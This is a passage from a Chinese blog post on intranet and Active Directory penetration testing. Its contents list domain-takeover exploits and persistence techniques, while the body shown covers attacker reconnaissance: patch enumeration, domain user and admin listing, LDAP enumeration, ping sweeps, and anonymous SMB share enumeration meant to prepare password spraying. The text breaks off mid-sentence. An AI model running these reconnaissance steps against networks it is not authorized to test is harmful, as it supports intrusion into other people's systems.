class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%98%AF%E5%90%A6%E5%87%BA%E7%BD%91"><span class="toc-number">5.1.</span> <span class="toc-text">查看是否出网</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#laps"><span class="toc-number">5.2.</span> <span class="toc-text">LAPS</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7"><span class="toc-number">6.</span> <span class="toc-text">获取域控</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ms14-068"><span class="toc-number">6.1.</span> <span class="toc-text">MS14-068</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">6.1.1.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%91%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">6.1.2.</span> <span class="toc-text">金银票据的区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#privexchangecve-2019-07240686-2"><span class="toc-number">6.2.</span> <span class="toc-text">Privexchange(CVE-2019-0724&#x2F;0686)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nopacsamaccountnamecve-2021-4228742278"><span class="toc-number">6.3.</span> <span class="toc-text">NoPAC&#x2F;SamAccountName(CVE-2021-42287&#x2F;42278)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">6.3.1.</span> <span class="toc-text">利用流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">6.3.2.</span> <span class="toc-text">适用工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E8%A7%A3%E9%87%8A"><span class="toc-number">6.3.3.</span> <span class="toc-text">相关解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#printnightmarecve-2021-167534527"><span class="toc-number">6.4.</span> <span class="toc-text">PrintNightmare(CVE-2021-1675&#x2F;34527)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4"><span class="toc-number">6.4.1.</span> <span class="toc-text">基本步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E5%B7%A5%E5%85%B7"><span class="toc-number">6.4.2.</span> <span class="toc-text">解决工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#certifriedcve-2022-26923need-adcs"><span class="toc-number">6.5.</span> <span class="toc-text">Certifried(CVE-2022-26923)[NEED ADCS]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">6.5.1.</span> <span class="toc-text">工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">6.5.2.</span> <span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zerologon"><span class="toc-number">6.6.</span> <span class="toc-text">zeroLogon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dcsync"><span class="toc-number">6.7.</span> <span class="toc-text">dcsync</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#adcsactive-directory-certificate-service%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE%E7%9A%84%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"><span class="toc-number">7.</span> <span class="toc-text">ADCS(Active Directory Certificate Service)错误配置的相关问题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ntlm%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BBesc8"><span class="toc-number">7.1.</span> <span class="toc-text">NTLM中继攻击（ESC8）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7-2"><span class="toc-number">7.1.1.</span> <span class="toc-text">工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#certifriedcve-2022-26923need-adcs-2"><span class="toc-number">7.2.</span> <span class="toc-text">Certifried(CVE-2022-26923)[NEED ADCS]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86-2"><span class="toc-number">7.3.</span> <span class="toc-text">相关知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lm%E4%B8%8Entlm"><span class="toc-number">7.3.1.</span> <span class="toc-text">LM与NTLM</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-3"><span class="toc-number">8.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-4"><span class="toc-number">8.1.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">8.1.1.</span> <span class="toc-text">计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E8%A6%81%E7%AB%AF%E5%8F%A3"><span class="toc-number">8.1.2.</span> <span class="toc-text">重要端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">8.1.3.</span> <span class="toc-text">敏感信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%AD%E8%AF%81%E4%BF%A1%E6%81%AF"><span class="toc-number">8.1.4.</span> <span class="toc-text">凭证信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83"><span class="toc-number">8.2.</span> <span class="toc-text">Windows本地提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#uacbypass"><span class="toc-number">8.2.1.</span> <span class="toc-text">UAC（Bypass）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5"><span class="toc-number">8.2.1.1.</span> <span class="toc-text">手工</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msf"><span class="toc-number">8.2.1.2.</span> <span class="toc-text">MSF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">8.2.1.3.</span> <span class="toc-text">其他</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1"><span class="toc-number">8.2.2.</span> <span class="toc-text">第三方服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E6%9C%BA"><span class="toc-number">8.2.2.1.</span> <span class="toc-text">打印机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">8.2.2.2.</span> <span class="toc-text">数据库</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#win%E6%BC%8F%E6%B4%9E"><span class="toc-number">8.2.3.</span> <span class="toc-text">Win漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83"><span class="toc-number">8.3.</span> <span class="toc-text">Linux本地提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#linux%E6%BC%8F%E6%B4%9E"><span class="toc-number">8.3.1.</span> <span class="toc-text">Linux漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E5%A4%84%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">8.4.</span> <span class="toc-text">入口处权限维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">8.5.</span> <span class="toc-text">Windows权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-%E9%AB%98%E6%9D%83%E9%99%90%E4%BD%8E%E6%9D%83%E9%99%90"><span class="toc-number">8.5.1.</span> <span class="toc-text">系统计划任务 [高权限&#x2F;低权限]</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">8.5.1.1.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E9%A1%B9"><span class="toc-number">8.5.1.2.</span> <span class="toc-text">服务项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E9%A1%B9-%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90system%E6%9D%83%E9%99%90"><span class="toc-number">8.5.2.</span> <span class="toc-text">常规注册表自启动项 [用户权限&#x2F;system权限]</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%90%AF%E5%8A%A8%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-number">8.5.2.1.</span> <span class="toc-text">自启动文件夹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-number">8.5.2.2.</span> <span class="toc-text">自启动项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="toc-number">8.5.2.3.</span> <span class="toc-text">注册表</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mssql%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B-%E7%BB%A7%E6%89%BF%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-number">8.5.3.</span> <span class="toc-text">Mssql存储过程 [继承服务权限]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wmi%E6%9E%84%E9%80%A0%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8"><span class="toc-number">8.5.4.</span> <span class="toc-text">WMI构造无文件后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#winlogon"><span class="toc-number">8.5.5.</span> <span class="toc-text">Winlogon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#clr"><span class="toc-number">8.5.6.</span> <span class="toc-text">CLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#logon-scriptswindows%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC"><span class="toc-number">8.5.7.</span> <span class="toc-text">Logon Scripts（Windows登录脚本）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mrupidllist"><span class="toc-number">8.5.8.</span> <span class="toc-text">MruPidlList</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mof"><span class="toc-number">8.5.9.</span> <span class="toc-text">Mof</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B2%98%E6%BB%9E%E9%94%AE"><span class="toc-number">8.5.10.</span> <span class="toc-text">粘滞键</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">8.5.11.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">8.6.</span> <span class="toc-text">Linux权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83-2"><span class="toc-number">8.6.1.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E6%B8%97%E9%80%8F"><span class="toc-number">9.</span> <span class="toc-text">域内渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E5%A4%9A%E5%B9%B3%E5%8F%B0%E5%88%B0%E6%8E%A7%E5%88%B6"><span class="toc-number">9.1.</span> <span class="toc-text">横向（多平台）到控制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#win-to-lin%E4%B8%8Elin-to-lin%E5%B7%AE%E4%B8%8D%E5%A4%9A"><span class="toc-number">9.1.1.</span> <span class="toc-text">WIN TO LIN（与LIN TO LIN差不多）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lin-to-win"><span class="toc-number">9.1.2.</span> <span class="toc-text">LIN TO WIN</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7"><span class="toc-number">10.</span> <span class="toc-text">域控</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90"><span class="toc-number">10.1.</span> <span class="toc-text">获取域控权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberos%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6"><span class="toc-number">10.1.1.</span> <span class="toc-text">Kerberos委派机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">10.1.1.1.</span> <span class="toc-text">非约束委派</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">10.1.1.2.</span> <span class="toc-text">约束委派</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gpp%E7%9B%AE%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-number">10.1.2.</span> <span class="toc-text">GPP目录账号密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E5%AF%B9%E5%9F%9F%E7%94%A8%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%8D%95%E5%AF%86%E7%A0%81%E5%B0%9D%E8%AF%95-%E5%96%B7%E5%B0%84%E5%88%A9%E7%94%A8adsi%E6%8E%A5%E5%8F%A3%E6%97%A5%E5%BF%97id-4771"><span class="toc-number">10.1.3.</span> <span class="toc-text">批量对域用户进行单密码尝试 [ 喷射,利用ADSI接口,日志id 4771 ]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%9C%8D%E5%8A%A1getshell"><span class="toc-number">10.1.4.</span> <span class="toc-text">基础服务getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4ldapkerberos"><span class="toc-number">10.1.5.</span> <span class="toc-text">爆破LDAP&amp;Kerberos</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">11.</span> <span class="toc-text">常用工具</span></a></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-内网安全（二）——补充版" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">内网安全（二）——补充版</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check">创建于</i> <a href="/articles/2023/07/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/" class="article-date"><time datetime="2023-07-28T02:07:35.000Z" itemprop="datePublished">2023-07-28</time> </a></span><span class="article-updated"><i class="icon icon-calendar-check">更新于</i> <a href="/articles/2023/07/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/" class="article-updated"><time datetime="2023-07-28T02:07:35.000Z" itemprop="datePublished">2023-07-28</time> </a></span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/articles/2023/07/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/" class="leancloud_visitors" data-flag-title="内网安全（二）——补充版"><span class="leancloud-visitors-count">0</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/articles/2023/07/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/#comments" class="article-comment-link">评论</a></span> <span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 13.7k(字)</span> <span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 54(分)</span></div></div><div class="article-entry marked-body" itemprop="articleBody"><h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><p>鉴于之前的内网安全这篇文章所述内容与实战相差还是有点大，没有很清晰的思路或者更加常用的方法来进行内网渗透，这里将结合之前的部分知识，拓展内网渗透攻击面，其中会涉及到很多名词，例如：</p><ul><li>委派机制（约束与非约束）</li><li>Exchange、OWA的渗透</li><li>SYSVOL、NETLOGON目录、GPP目录等</li><li>…</li></ul><p>但是万变不离其宗，思路为：</p><ol><li><p>拿下边缘主机，做好权限维持，网段进行扫描发现主机</p><ol><li>如若必要，权限提升</li><li>如若必要，进行免杀</li></ol></li><li><p>横向，隧道/代理</p><ol><li>横向包括文件传输与命令执行、权限提升与维持</li><li>代理隧道需要确定通行的协议</li><li>横向中常遇到的一些服务</li></ol></li><li><p>域控</p><ol><li>获得权限三板斧：组策略、哈希碰撞、金银票据</li><li>这个还涉及dump凭证的操作，在内网主机中也适用</li></ol></li></ol><p>其实不仅如此，内网安全包括域渗透和工作组渗透。</p><p>基于此思路。此篇文章从三个方面做总结，分别为边缘+横向+域控。</p><h1 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h1><p>这里，需要搜集的东西有很多，每个都有相应的作用，搜集信息分为两个方面，一个是本机信息搜集，一个是域内信息搜集。</p><h2 id="本机信息搜集"><a class="markdownIt-Anchor" href="#本机信息搜集"></a> 本机信息搜集</h2><h3 id="手动"><a class="markdownIt-Anchor" href="#手动"></a> 手动</h3><ol><li><p>操作系统：有的操作系统用的指令不同，例如关闭防火墙，还有的漏洞就不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure></li><li><p>杀毒软件/进程/服务列表：分析杀毒软件/安全监控工具等 邮件客户端 VPN ftp等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc</span><br><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure></li><li><p>端口：看有什么服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure></li><li><p>服务：看有什么服务是错误配置的，例如路径错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure></li><li><p>安装的软件版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br><span class="line"></span><br><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure></li><li><p>补丁：看有什么提权漏洞没有被修补的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 本地执行</span><br><span class="line">wmic qfe get Caption, Description, HotFixID, InstalledOn</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line"># msf/empire 都有相应的模块</span><br><span class="line">msf&gt; use post/windows/gather/enum_patches</span><br><span class="line">msf&gt; use post/multi/recon/local_exploit_suggester</span><br><span class="line">empire&gt; powershell/situational_awareness/host/winenum</span><br><span class="line"></span><br><span class="line"># 脚本工具</span><br><span class="line">windows exploit suggseter</span><br></pre></td></tr></table></figure></li><li><p>权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看Mandatory Lable，提升到HIGH最好啦</span><br><span class="line">whoami /groups </span><br></pre></td></tr></table></figure></li><li><p>会话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure></li><li><p>共享</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure></li><li><p>计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure></li><li><p>路由/缓存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br><span class="line">arp –a</span><br></pre></td></tr></table></figure></li></ol><h3 id="自动化脚本"><a class="markdownIt-Anchor" href="#自动化脚本"></a> 自动化脚本</h3><p>wmic 脚本下载地址：<a target="_blank" rel="noopener" href="https://www.fuzzysecurity.com/scripts/files/wmic_info.rar">https://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p><p>PowerShsell Empire</p><p>MSF</p><h2 id="域信息搜集"><a class="markdownIt-Anchor" href="#域信息搜集"></a> 域信息搜集</h2><p>主要包括：</p><ol><li><p>权限：</p></li><li><p>域sid：可以用来构造金银票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wimc username get /all</span><br></pre></td></tr></table></figure></li><li><p>搜集用户信息：</p><ol><li><p>枚举LDAP：搜集用户信息，可以用于密码喷洒攻击，获得更多用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -sV --script &quot;ldap* and not brute&quot; -p 389 &lt;dc-ip&gt;</span><br><span class="line">ldapsearch -x -H ldap://192.168.31.242:389 -s base</span><br></pre></td></tr></table></figure></li><li><p>发现域内用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br><span class="line">wimc username get /all</span><br><span class="line"># 本地管理员名</span><br><span class="line">net localgroup administrators</span><br><span class="line"></span><br><span class="line"># 脚本工具</span><br><span class="line">## Adfind</span><br><span class="line">AdFind.exe -users name</span><br><span class="line">## emun4linux</span><br><span class="line">enum4linux -a -u &quot;&quot; -p &quot;&quot; &lt;dc-ip&gt;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>当前域和工作组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure></li><li><p>判断主域、域控IP、域控名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 主域名</span><br><span class="line">net view /domain</span><br><span class="line"># 域用户组</span><br><span class="line">net group /domain</span><br><span class="line"># 域管理员列表</span><br><span class="line">net group &quot;Domain Admins&quot; /domain</span><br><span class="line"># 域控IP</span><br><span class="line">nslookup -type=SRV _ldap.tcp</span><br><span class="line"># 域控名</span><br><span class="line">nltest /DCLIST:&lt;domain&gt;</span><br><span class="line">net time /domain</span><br></pre></td></tr></table></figure></li><li><p>域内存活主机：获得存活主机，则可以对主机进行攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># ICMP探测</span><br><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL=&quot;</span><br><span class="line"></span><br><span class="line"># 工具</span><br><span class="line">## crackmapexec</span><br><span class="line">## fscan</span><br><span class="line">fscan -h 192.168.1.1/24</span><br><span class="line">## adfind</span><br><span class="line">## ntbscan</span><br><span class="line">ntbscan 192.168.1.1/24</span><br></pre></td></tr></table></figure></li><li><p>域密码策略：使用密码喷洒时需要注意的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure></li><li><p>smb共享列表（匿名）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -a -u &quot;&quot; -p &quot;&quot; &lt;dc-ip&gt;</span><br><span class="line">enum4linux -a -u &quot;guest&quot; -p &quot;&quot; &lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">smbmap -u &quot;&quot; -p &quot;&quot; -P 445 -H &lt;dc-ip&gt;</span><br><span class="line">smbmap -u &quot;guest&quot; -p &quot;&quot; -P 445 -H &lt;dcip&gt;</span><br><span class="line"></span><br><span class="line">cme smb &lt;ip&gt; -u &#x27;&#x27; -p &#x27;&#x27; # 枚举可空Session访问的SMB共享</span><br><span class="line">cme smb &lt;ip&gt; -u &#x27;a&#x27; -p &#x27;&#x27; #枚举可匿名访问的SMB共享</span><br></pre></td></tr></table></figure></li><li><p>后台RCE：如果后台存在漏洞，就可以直接打</p></li><li><p>SPN服务：</p></li></ol><h2 id="相关知识点"><a class="markdownIt-Anchor" href="#相关知识点"></a> 相关知识点</h2><h3 id="windows-名称解析机制"><a class="markdownIt-Anchor" href="#windows-名称解析机制"></a> windows 名称解析机制</h3><p>在内网中通信的时候，基于计算机名称解析的时候走的就是windows名称解析机制，其中参与协议的有三个，分别是 DNS LLMNR NETBIOS 这三种。</p><h4 id="解析顺序"><a class="markdownIt-Anchor" href="#解析顺序"></a> 解析顺序</h4><p>先进行 DNS 名称解析，如果 DNS 解析名称失败，则会使用 LLMNR 进行名称解析，最后才会使用 NetBIOS 名称解析。</p><h4 id="llmnr"><a class="markdownIt-Anchor" href="#llmnr"></a> LLMNR</h4><p>该服务监听端口5355。LLMNR，从 Windows Vista 起，Windows 操作系统开始支持一种新的名称解析协议 —— LLMNR，主要用于局域网中的名称解析。</p><p>原因就是 LLMNR 能够很好的支持 IPv4 和 IPv6，因此在 Windows 名称解析顺序中是一个仅次于 DNS 的名称解析方式，更重要的是在 Linux 操作系统中也实现了 LLMNR。</p><p>LLMNR 进行名称解析的过程为:</p><ul><li>检查本地 NetBIOS 缓存</li><li>如果缓存中没有则会像当前子网域发送广播包</li><li>当前子网域的其他主机收到并检查广播包，如果没有主机响应则请求失败</li></ul><h4 id="netbios"><a class="markdownIt-Anchor" href="#netbios"></a> NetBios</h4><p>NETBIOS服务监听的端口为 UDP/137，其进行名称解析的形式为向当前主机所在的子网域发送广播包。所以，当你使用抓包工具在局域网中抓包时总会收到很多 NBNS 数据包。</p><p>综上所述，NetBIOS 协议进行名称解析的过程如下：</p><ul><li>检查本地 NetBIOS 缓存</li><li>如果缓存中没有请求的名称且已配置了 WINS 服务器，接下来则会向 